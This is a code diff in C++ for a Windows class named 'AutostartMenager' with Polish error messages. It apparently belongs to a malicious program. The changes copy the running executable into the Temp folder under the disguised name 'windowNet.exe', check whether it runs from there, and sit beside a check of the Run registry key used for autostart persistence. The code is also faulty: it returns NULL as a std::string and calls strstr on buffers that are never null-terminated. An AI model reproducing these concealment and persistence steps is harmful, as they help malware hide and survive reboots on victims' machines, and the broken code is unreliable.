@@ -6,37 +6,50 @@
 
 using namespace std;
 
-bool AutostartMenager::isInTempFolder() {
+bool AutostartMenager::isInTempFolder(string currentPath) {
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath) == 0) {
         std::cerr << "Nie udało się uzyskać ścieżki do folderu Temp." << std::endl;
         return false;
     }
 
-    char currentPath[MAX_PATH];
-    DWORD dwRet = GetCurrentDirectoryA(MAX_PATH, currentPath);
-    if (dwRet == 0) {
-        std::cerr << "Nie udało się uzyskać ścieżki do bieżącego katalogu." << std::endl;
-        return false;
-    }
+    char charCurrentPath[MAX_PATH];
+    for(int i=0;i<MAX_PATH;i++)
+        if(i < currentPath.size())
+            charCurrentPath[i]=currentPath[i];
+        else
+            charCurrentPath[i]='t';
 
-    if (strstr(currentPath, tempPath) != nullptr) {
+    for(int i=MAX_PATH-1;i>=0;i--)
+        if (tempPath[i]=='\\'){
+            for(int x=i;x<MAX_PATH;x++)
+                tempPath[x]='t';
+            break;
+        }
+    
+    for(int i=MAX_PATH-1;i>=0;i--)
+        if (charCurrentPath[i]=='\\'){
+            for(int x=i;x<MAX_PATH;x++)
+                charCurrentPath[x]='t';
+            break;
+        }
+    //cout << tempPath << "\n" << charCurrentPath << "\n";
+    if (strstr(charCurrentPath, tempPath) != nullptr) {
         return true;
     }
-
     return false;
 }
-void AutostartMenager::moveToTempFolder() {
+string AutostartMenager::moveToTempFolder() {
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath) == 0) {
         std::cerr << "Nie udało się uzyskać ścieżki do folderu Temp." << std::endl;
-        return;
+        return NULL;
     }
 
     char fileName[MAX_PATH];
     if (GetModuleFileNameA(NULL, fileName, MAX_PATH) == 0) {
         std::cerr << "Nie udało się uzyskać ścieżki do pliku wykonywalnego." << std::endl;
-        return;
+        return NULL;
     }
 
     std::string newFilePath = std::string(tempPath) + "windowNet.exe";
@@ -49,8 +62,8 @@ void AutostartMenager::moveToTempFolder() {
     } else {
         std::cerr << "Błąd podczas przenoszenia pliku: " << GetLastError() << std::endl;
     }
+    return newFilePath;
 }
-
 bool AutostartMenager::isInStartup(const std::string& appName) {
     HKEY hKey;
     const char* registryPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
